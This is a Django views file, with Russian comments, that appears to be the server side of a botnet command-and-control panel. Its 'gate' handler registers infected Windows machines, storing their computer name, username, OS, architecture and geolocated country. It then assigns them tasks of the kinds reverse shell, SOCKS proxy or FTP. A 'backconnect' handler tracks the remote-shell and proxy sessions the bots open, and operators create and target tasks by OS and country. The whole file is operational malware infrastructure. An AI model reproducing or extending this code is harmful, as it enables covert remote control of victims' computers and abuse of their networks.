import pytz
from django.shortcuts import HttpResponse, render
from django.http import JsonResponse
from django.contrib.auth.models import User
from django.contrib.auth import login, logout
from django.views.decorators.csrf import csrf_exempt
from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
from .models import Bot, Session, Task
import datetime
import struct
import requests
from django.db import models


# from django.core.paginator import Paginator


# ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/

class Subsidiary:

    @staticmethod
    def get_country(ip: str):
        if ip == '127.0.0.1':
            return ''
        country = requests.get(f'http://api.sypexgeo.net/json/{ip}').json()['country']['iso'].lower()
        return country

    @staticmethod
    def get_bot_ip(request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        return ip

    @staticmethod
    def get_by_week(_classes: iter) -> int:

        res = []
        now_date = datetime.datetime.now()

        for _class in _classes:

            if _class.date.isocalendar()[0] == now_date.isocalendar()[0] and \
                    _class.date.isocalendar()[1] == now_date.isocalendar()[1]:
                res.append(_class)

        return len(res)

    @staticmethod
    def get_by_day(_classes: iter) -> int:

        res = []
        now_date = datetime.datetime.now()

        for _class in _classes:

            if _class.date.day == now_date.day and \
                    _class.date.year == now_date.year and \
                    _class.date.month == now_date.month:
                res.append(_class)

        return len(res)

    @staticmethod
    def get_by_month(_classes: iter) -> int:

        res = []
        now_date = datetime.datetime.now()

        for _class in _classes:

            if _class.date.year == now_date.year and \
                    _class.date.month == now_date.month:
                res.append(_class)

        return len(res)


# ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- /\

# ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- \/

class AdminPanel:
    def __init__(self, subsidiary):
        self.sub = subsidiary

    @staticmethod
    def get_login_page(request) -> render:
        return render(request, 'main/login.html')

    def get_main_page(self, request) -> HttpResponse or render:
        bots = Bot.objects.all()

        counts_is_win7 = Bot.objects.filter(is_win7=True).count()
        counts_is_win10 = Bot.objects.filter(is_win10=True).count()
        counts_is_winxp = Bot.objects.filter(is_winxp=True).count()
        counts_is_win8 = Bot.objects.filter(is_win8=True).count()
        counts_is_win11 = Bot.objects.filter(is_win11=True).count()

        _32x = Bot.objects.filter(is_x64=False).count()
        _64x = Bot.objects.filter(is_x64=True).count()

        in_week = self.sub.get_by_week(bots)
        in_day = self.sub.get_by_day(bots)
        in_month = self.sub.get_by_month(bots)
        total = bots.count()
        print([counts_is_win7, counts_is_winxp, counts_is_win8, counts_is_win10, counts_is_win11])

        if request.user.is_superuser:
            return render(request, 'main/main.html', {'win_version': [counts_is_win7, counts_is_winxp, counts_is_win8,
                                                                      counts_is_win10, counts_is_win11],
                                                      'x_oc': [_32x, _64x], 'in_week': in_week, 'in_day': in_day,
                                                      'in_month': in_month, 'total': total})

        return HttpResponse('недостачно прав для просмотра')

    @staticmethod
    def get_table_page(request) -> render:
        if not request.user.is_superuser:
            return HttpResponse('недостачно прав для просмотра')

        tz = pytz.UTC

        for bot in Bot.objects.all():
            if (datetime.datetime.now(tz=tz) - bot.date_ch).seconds // 60 > 3:
                bot.is_online = False
                bot.save()

        bots = Bot.objects.all()

        return render(request, 'main/table.html', {'bots': bots})

    @staticmethod
    def get_sessions_page(request):
        if not request.user.is_superuser:
            return HttpResponse('недостачно прав для просмотра')
        sessions = Session.objects.all()
        return render(request, 'main/session.html', {'sessions': sessions})

    @staticmethod
    def task(request) -> render:
        if not request.user.is_superuser:
            return HttpResponse('недостачно прав для просмотра')
        return render(request, 'main/task.html')

    @staticmethod
    def admin_table(request):
        if not request.user.is_superuser:
            return HttpResponse('недостачно прав для просмотра')
        return render(request, 'main/admin_table.html', {'tasks': Task.objects.all()})

    @staticmethod
    def change_password(request):
        return render(request, 'main/change_password.html')

    @staticmethod
    def get_settings_page(request):
        return render(request, 'main/settings.html')


# ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\


# ОБРАБОТЧИКИ --------------------------------------------\/


class Handlers:
    def __init__(self, subsidiary):
        self.sub = subsidiary
        self.s = {}

    def test(self):
        return JsonResponse(self.s)

    @csrf_exempt
    def change_password(self, request):
        old = request.POST['old']
        new = request.POST['new']

        if not request.user.check_password(old):
            print('ok')
            return HttpResponse('')

        request.user.set_password(new)
        request.user.save()

        login(request, request.user)

        return HttpResponse('200')

    @csrf_exempt
    def add_comment(self, request):

        print(request.POST)
        comment_text = request.POST['comment']
        print(comment_text)
        uid = request.POST['uid']

        bot = Bot.objects.get(uid=uid)
        bot.comment = comment_text
        bot.save()

        return HttpResponse('200')

    @staticmethod
    def logout(request):
        logout(request)
        return JsonResponse({'v': '200'})

    @staticmethod
    def login_handler(request) -> HttpResponse or JsonResponse:
        username = request.POST['login']

        try:
            usr = User.objects.get(username=username)
            res = usr.check_password(request.POST['password'])
            if not res:
                return JsonResponse({'v': '400'})

            login(request, usr)
            return JsonResponse({'v': '200'})
        except Exception as e:
            print(e)
            return JsonResponse({'v': '400'})

    @csrf_exempt
    def backconnect(self, request):
        try:

            msg_type = struct.unpack('=I', request.body[:4])[0]
            if msg_type == 1:

                types = {
                    1: 'ftp', 2: 'reverse shell', 3: 'socks'
                }

                ip = self.sub.get_bot_ip(request)

                session = BackConnectMsg.NewConnection()
                session.ParseFromString(request.body[4:])

                uid = session.uid.decode('utf-16-le')
                _type = types[session.type]
                ip_port = str(ip) + ':' + str(session.port)

                new_session = Session(uid=uid, ip_port=ip_port, connection_type=_type)
                new_session.save()
                return HttpResponse('200')

            elif msg_type == 2:
                conn = BackConnectMsg.ConnectionClosed()
                conn.ParseFromString(request.body[4:])

                session = Session.objects.get(uid=conn.uid.decode('utf-16-le'))
                session.delete()

                return HttpResponse('200')

        except Exception as e:
            print(e)
            return HttpResponse('400')

    @csrf_exempt
    def stop_conn(self, request):
        try:
            _id = request.POST['_id']
            session = Session.objects.get(uid=_id)
            session.delete()
            return HttpResponse('200')

        except Exception as e:
            print(e)
            return HttpResponse('400')

    @csrf_exempt
    def gate(self, request) -> HttpResponse:

        msg_type = struct.unpack('=I', request.body[:4])[0]

        if msg_type == 1:
            try:
                bot = BotMsg.RegisterBot()
                bot.ParseFromString(request.body[4:])

                ip = self.sub.get_bot_ip(request)

                country = self.sub.get_country(ip)

                uid = bot.uid.decode('utf-16-le')
                computername = bot.computername.decode('utf-16-le')
                username = bot.username.decode('utf-16-le')
                os_major = bot.os_major
                os_minor = bot.os_minor
                is_x64 = bot.is_x64
                is_server = bot.is_server

                try:
                    _bot = Bot.objects.get(uid=uid)
                except Exception as e:
                    print(e)
                    _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64,
                               is_server=is_server, country=country)

                if os_major == 10 and os_minor == 0:
                    _bot.is_win10 = True
                elif os_major == 6 and os_minor == 1:
                    _bot.is_win7 = True
                elif os_major == 5 and os_minor == 1:
                    _bot.is_winxp = True

                if is_x64:
                    xoc = 'x64'
                else:
                    xoc = 'x32'

                _bot.save()

                if _bot.is_winxp:
                    task_win = 'winxp'
                elif _bot.is_win7:
                    task_win = 'win7'
                elif _bot.is_win10:
                    task_win = 'win10'

                tasks = [task for task in Task.objects.all() if (task.xoc == xoc or
                task.xoc == 'x32_64') or (task.winos == 'all_win' or task.winos == task_win)]

                for task in tasks:
                    _bot.tasks.add(task)

                _bot.save()

                res = PanelMsg.RegistrationResult()
                res.result = True
                res.dummy = False

                return HttpResponse(res.SerializeToString())

            except Exception as e:
                print(e)

                res = PanelMsg.RegistrationResult()
                res.result = False
                res.dummy = True

                return HttpResponse(res.SerializeToString())

        elif msg_type == 2:
            ar = BotMsg.ActivityReport()
            ar.ParseFromString(request.body[4:])
            uid = ar.uid.decode('utf-16-le')
            bot = Bot.objects.get(uid=uid)
            bot.is_online = True
            bot.save()

            print(bot.tasks.all())
            print(bot.tasks.all()[0].type1)

            s = {
                'ftp': 2,
                'sock': 3,
                'shell': 1
            }

            task = bot.tasks.all()[0]

            giveaway = PanelMsg.TaskGiveaway()
            giveaway.type = s[task.type1]
            giveaway.task_id = str(task.id).encode('utf-16-le')
            giveaway.server = '127.0.0.1'.encode('utf-16-le')
            giveaway.port = 8000
            giveaway.SerializeToString()
            print(bot.date_ch)

            return HttpResponse(giveaway)

        elif msg_type == 3:
            print(3)
            return HttpResponse('200')

    @csrf_exempt
    def hosts(self, request):
        host = BotMsg.Config.Host()
        host.ParseFromString(request.body)
        is_https = host.is_https
        domain = host.domain.decode('utf-16-le')
        return HttpResponse('200')

    @staticmethod
    @csrf_exempt
    def ban(request) -> JsonResponse:
        bot = Bot.objects.get(uid=request.POST['uid'])
        bot.is_banned = True
        bot.save()
        return JsonResponse({'v': '200'})

    @staticmethod
    @csrf_exempt
    def unban(request) -> JsonResponse:
        bot = Bot.objects.get(uid=request.POST['uid'])
        bot.is_banned = False
        bot.save()
        return JsonResponse({'v': '200'})

    @csrf_exempt
    def create_task(self, request):
        data = request.POST
        print(data)
        name = data['name']
        country = data['country']
        _type = data['type']
        _true = [i for i in request.POST if data[i] == 'true']
        print(_true)
        wins = [i for i in _true if 'win' in i]
        x_oc = [i for i in _true if 'x' in i]
        print(wins, x_oc)

        s = {
            'win7': Bot.objects.filter(is_win7=True),
            'win8': Bot.objects.filter(is_win8=True),
            'win10': Bot.objects.filter(is_win10=True),
            'win11': Bot.objects.filter(is_win11=True),
            'all_win': Bot.objects.all()
        }

        bots = [s[win] for win in wins if len(s[win]) != 0]

        if 'x32_64' in x_oc:
            _bots = [bot for bot in bots[0] if bot.is_banned is False]
        else:
            _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
                     is False]

        print(_bots)

        task = Task(name=name, country=country, type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
                    repetitions=data['reps'],
                    done=0)
        task.save()

        for bot in _bots:
            bot.tasks.add(task)

        return HttpResponse('200')



# ОБРАБОТЧИКИ -------------------------------------------- /
